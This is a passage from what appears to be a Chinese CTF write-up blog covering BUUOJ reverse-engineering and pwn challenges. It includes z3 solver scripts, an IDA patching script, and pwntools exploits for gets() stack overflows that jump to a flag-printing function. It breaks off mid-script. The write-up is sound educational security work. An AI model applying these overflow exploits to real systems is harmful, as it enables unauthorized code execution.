class="keyword">if</span> ( v1 &lt;= <span class="number">0x16</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">22</span>] != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v4 = input[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">if</span> ( v4 != <span class="number">115</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( (input[<span class="number">3</span>] ^ <span class="string">&#x27;t&#x27;</span>) != <span class="number">18</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v5 = input[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ( v5 != <span class="string">&#x27;c&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v6 = input[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">if</span> ( v6 != <span class="number">100</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v7 = input[<span class="number">13</span>];</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">12</span>] != v7 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">19</span>] != <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v8 = input[<span class="number">14</span>];</span><br><span class="line">v9 = input[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span> ( v9 + v8 != <span class="string">&#x27;h&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v10 = input[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">if</span> ( v10 != <span class="number">123</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v11 = input[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">15</span>] != v11 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v11 + <span class="number">4</span> == v5</span><br><span class="line">  &amp;&amp; (v12 = input[<span class="number">17</span>], v13 = input[<span class="number">11</span>], <span class="string">&#x27;&#125;&#x27;</span> - v12 + <span class="number">40</span> == v13)</span><br><span class="line">  &amp;&amp; (v14 = input[<span class="number">18</span>], v15 = v12 + v13 - v4 - v14, v16 = v14 - v12, v15 == v16)</span><br><span class="line">  &amp;&amp; (v17 = v9 - v12, *input == v16 * (v17 &gt;&gt; <span class="number">1</span>) + <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  &amp;&amp; (v18 = input[<span class="number">10</span>], v7 + <span class="number">1</span> == v18)</span><br><span class="line">  &amp;&amp; v17 + <span class="number">2</span> * v17 + <span class="number">4</span> * (v10 - v6) == v18</span><br><span class="line">  &amp;&amp; input[<span class="number">20</span>] - v5 == <span class="number">2</span> * v16</span><br><span class="line">  &amp;&amp; (v4 ^ <span class="string">&#x27;n&#x27;</span>) == <span class="number">29</span></span><br><span class="line">  &amp;&amp; v17 == <span class="number">4</span> * v16</span><br><span class="line">  &amp;&amp; input[<span class="number">6</span>] == v8 )</span><br><span class="line">&#123;</span><br><span class="line">  main_win();</span><br><span class="line">  v3 = v24;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则可以直接用z3暴力解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>)]</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">9</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">16</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">21</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">22</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">5</span>] == <span class="number">115</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>] ^ <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>) == <span class="number">18</span>)</span><br><span class="line">s.add(x[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">7</span>] == <span class="number">100</span>)</span><br><span class="line">s.add(x[<span class="number">12</span>] == x[<span class="number">13</span>])</span><br><span class="line">s.add(x[<span class="number">19</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">14</span>] + x[<span class="number">6</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">4</span>] == <span class="number">123</span>)</span><br><span class="line">s.add(x[<span class="number">15</span>] == x[<span class="number">8</span>])</span><br><span class="line">s.add(x[<span class="number">8</span>] + <span class="number">4</span> == x[<span class="number">1</span>])</span><br><span class="line">v12 = x[<span class="number">17</span>]</span><br><span class="line">v13 = x[<span class="number">11</span>]</span><br><span class="line">s.add(x[<span class="number">11</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>)- x[<span class="number">17</span>] + <span class="number">40</span>)</span><br><span class="line">v14 = x[<span class="number">18</span>]</span><br><span class="line">v4 = x[<span class="number">5</span>]</span><br><span class="line">v15 = v12 + v13 - v4 - v14</span><br><span class="line">v16 = v14 - v12</span><br><span class="line">s.add(v15 == v16)</span><br><span class="line">v9 = x[<span class="number">6</span>]</span><br><span class="line">v17 = v9 - v12</span><br><span class="line">s.add(x[<span class="number">0</span>] == v16 * (v17 &gt;&gt; <span class="number">1</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>))</span><br><span class="line">v18 = x[<span class="number">10</span>]</span><br><span class="line">v7 = x[<span class="number">13</span>]</span><br><span class="line">s.add(v7 + <span class="number">1</span> == v18)</span><br><span class="line">v10 = x[<span class="number">4</span>]</span><br><span class="line">v6 = x[<span class="number">7</span>]</span><br><span class="line">s.add(v17 + <span class="number">2</span> * v17 + <span class="number">4</span> * (v10 - v6) == v18)</span><br><span class="line">v5 = x[<span class="number">1</span>]</span><br><span class="line">s.add(x[<span class="number">20</span>] - v5 == <span class="number">2</span> * v16)</span><br><span class="line">s.add((v4 ^ <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>)) == <span class="number">29</span>)</span><br><span class="line">s.add(v17 == <span class="number">4</span> * v16)</span><br><span class="line">v8 = x[<span class="number">14</span>]</span><br><span class="line">s.add(x[<span class="number">6</span>] == v8)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    flag.append(m[i].as_long())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-DontEatMe"><a href="#RCTF2019-DontEatMe" class="headerlink" title="[RCTF2019]DontEatMe"></a>[RCTF2019]DontEatMe</h3><p><a href="https://lantern.cool/wp-games-2019rctf/">2019 RCTF | Lantern’s 小站</a></p><h3 id="XMAN2018排位赛-Dragon-Quest"><a href="#XMAN2018排位赛-Dragon-Quest" class="headerlink" title="[XMAN2018排位赛]Dragon Quest"></a>[XMAN2018排位赛]Dragon Quest</h3><p>存在大量不透明谓词，用脚本直接去掉(pizza yyds)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_xref</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_bytes, patch_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_patch</span>(<span class="params">ea</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(get_bytes(ea, <span class="number">1</span>) == <span class="string">b&quot;\x8B&quot;</span>): <span class="comment"># mov eax-edi, dword</span></span><br><span class="line">        reg = (<span class="built_in">ord</span>(get_bytes(ea + <span class="number">1</span>, <span class="number">1</span>)) &amp; <span class="number">0b00111000</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">        patch_bytes(ea, (<span class="number">0xB8</span> + reg).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + <span class="string">b&#x27;\x00\x00\x00\x00\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>(get_bytes(ea, <span class="number">2</span>) == <span class="string">b&quot;\x44\x8B&quot;</span>): <span class="comment"># mov r8d-r15d, dword</span></span><br><span class="line">        reg = (<span class="built_in">ord</span>(get_bytes(ea + <span class="number">2</span>, <span class="number">1</span>)) &amp; <span class="number">0b00111000</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">        patch_bytes(ea + <span class="number">1</span>, (<span class="number">0xB8</span> + reg).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + <span class="string">b&#x27;\x00\x00\x00\x00\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0000000000610318</span>, <span class="number">0x00000000006105AC</span>, <span class="number">4</span>):</span><br><span class="line">    ref = ida_xref.get_first_dref_to(addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr).center(<span class="number">20</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    <span class="keyword">while</span>(ref != ida_idaapi.BADADDR):</span><br><span class="line">        do_patch(ref)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;patch at &#x27;</span> + <span class="built_in">hex</span>(ref))</span><br><span class="line">        ref = ida_xref.get_next_dref_to(addr, ref)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>之后逻辑便比较清晰了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">start_quest</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD v2[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+48h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+4Fh] [rbp-41h]</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> *input; <span class="comment">// [rsp+50h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// [rsp+58h] [rbp-38h]</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> *i; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = a1; ; v2[<span class="number">1</span>] = <span class="built_in">std</span>::<span class="built_in">string</span>::length(i) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &amp;v2[<span class="number">-2</span>];</span><br><span class="line">    v7 = &amp;v2[<span class="number">-2</span>];</span><br><span class="line">    v6 = (<span class="keyword">int</span> *)&amp;v2[<span class="number">-2</span>];</span><br><span class="line">    input = (<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v2[<span class="number">-2</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_100);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_214);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_266);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_369);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_417);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_527);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_622);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_733);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_847);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_942);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1054);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1106);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1222);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1336);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1441);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1540);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1589);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1686);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1796);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1891);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1996);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2112);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2165);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2260);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2336);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2412);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2498);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2575);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::length(i) - <span class="number">1LL</span> != legend &gt;&gt; <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_100);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_214);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_266);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_369);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_417);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_527);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_622);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_733);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_847);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_942);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1054);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1106);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1222);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1336);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1441);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1540);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1589);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1686);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1796);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1891);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1996);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2112);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2165);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2260);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2336);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2412);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2498);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2575);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v6 = legend &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(input, i);</span><br><span class="line">    v3 = sanitize_input(input);</span><br><span class="line">    *v6 = v3;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(input);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是进行一些初始化和校验flag长度是否为<code>(legend &gt;&gt; 2) + 1</code>, 其中<code>legend == 0x73</code>，接着进入<code>sanitize_input</code>函数</p><p><code>sanitize_input</code>反编译看起来比较复杂，但实际操作就是依次从输入中取出存入另一个<code>vector</code>中，当<code>vector</code>中数大于等于两个时开始送入<code>transform_input</code>中处理后，与hero中的数进行对比</p><p><code>transform_input</code>函数将该<code>vector</code>中的数进行求和</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">100</span>, <span class="number">214</span>, <span class="number">266</span>, <span class="number">369</span>, <span class="number">417</span>, <span class="number">527</span>, <span class="number">622</span>, <span class="number">733</span>, <span class="number">847</span>, <span class="number">942</span>, <span class="number">1054</span>, <span class="number">1106</span>, <span class="number">1222</span>, <span class="number">1336</span>,</span><br><span class="line">        <span class="number">1441</span>, <span class="number">1540</span>, <span class="number">1589</span>, <span class="number">1686</span>, <span class="number">1796</span>, <span class="number">1891</span>, <span class="number">1996</span>, <span class="number">2112</span>, <span class="number">2165</span>, <span class="number">2260</span>, <span class="number">2336</span>, <span class="number">2412</span>, <span class="number">2498</span>, <span class="number">2575</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    data[i] -= data[i-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Pwn环境"><a href="#Pwn环境" class="headerlink" title="Pwn环境"></a>Pwn环境</h3><p>BUUOJ上的Pwn环境libc版本都可以从下面的网址下载</p><p><a target="_blank" rel="noopener" href="https://buuoj.cn/resources">https://buuoj.cn/resources</a></p><h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h3><p>直接<code>nc</code>上去<code>cat flag</code></p><h3 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  rip checksec pwn1</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>基本没开保护</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv); <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>fun</code>函数，直接溢出到<code>fun</code>即可</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211019211223467.png" alt="image-20211019211223467"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;please input\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;1&quot;</span> * <span class="number">15</span> + <span class="string">b&quot;2&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x000000000040118A</span>) </span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;ok,bye!!!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>保护基本没开，主函数存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);                              <span class="comment">// 栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>cat flag</code>函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_40060D()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./warmup_csaw_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line"></span><br><span class="line">payload = <span 